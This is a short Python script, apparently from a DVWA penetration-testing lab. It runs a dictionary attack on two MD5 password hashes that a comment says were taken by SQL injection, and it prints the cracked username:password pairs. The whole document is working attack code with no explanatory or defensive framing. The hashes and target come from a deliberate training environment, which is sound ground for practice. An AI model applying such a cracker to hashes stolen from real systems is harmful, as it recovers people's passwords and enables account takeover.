
import hashlib

# Hashes extracted via SQL injection
hashes = {
    'gordonb': 'e99a18c428cb38d5f260853678922e03',
    'pablo': '0d107d09f5bbe40cade3de5c71e9e9b7'
}

# Common password dictionary
common_passwords = [
    'password', '123456', '12345678', 'qwerty', 'abc123', 'monkey', '1234567',
    'letmein', 'trustno1', 'dragon', 'baseball', 'iloveyou', 'master', 'sunshine',
    'ashley', 'bailey', 'passw0rd', 'shadow', '123123', '654321', 'superman',
    'qazwsx', 'michael', 'football', 'password1', 'password123', 'batman',
    'login', 'admin', 'welcome', 'hello', 'charlie', 'donald', '1234', 'test',
    'pass', 'secret', 'god', 'angel', 'buddy', 'whatever', 'qwerty123',
    'summer', 'winter', 'spring', 'fall', 'love', 'money', 'freedom'
]

print("[*] Cracking MD5 hashes from DVWA database...\n")

cracked = {}

for user, hash_value in hashes.items():
    print(f"[*] Cracking hash for user '{user}': {hash_value}")
    
    for password in common_passwords:
        if hashlib.md5(password.encode()).hexdigest() == hash_value:
            cracked[user] = password
            print(f"[+] CRACKED: {user}:{password}")
            break
    else:
        print(f"[-] Could not crack hash for {user}")
    print()

if cracked:
    print("\n[+] SUCCESS: Cracked password hashes!")
    print("[*] Recovered credentials:")
    for user, pwd in cracked.items():
        print(f"  {user}:{pwd}")
else:
    print("\n[-] No hashes cracked with current dictionary")

